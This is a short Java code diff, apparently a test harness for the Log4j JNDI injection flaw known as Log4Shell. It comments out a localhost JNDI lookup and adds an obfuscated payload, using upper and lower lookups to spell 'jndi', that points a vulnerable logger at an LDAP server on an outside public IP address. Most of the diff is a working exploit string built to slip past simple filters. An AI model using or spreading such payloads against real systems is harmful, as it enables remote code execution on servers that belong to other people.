@@ -12,9 +12,11 @@ public class Test {
     private static final Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);
 
     public static void main(String[] args) {
-        logger.error("java.version = ${java:version}, os = ${java:os}");
+        /*logger.error("java.version = ${java:version}, os = ${java:os}");
 
         logger.error("${jndi:ldap://127.0.0.1:1389/badClassName}");
+*/
+        logger.error("${${upper:j}nd${lower:i}:ldap://115.29.171.175:1389/nzxk40}");
     }
 
 //    public static void main(String[] args) {
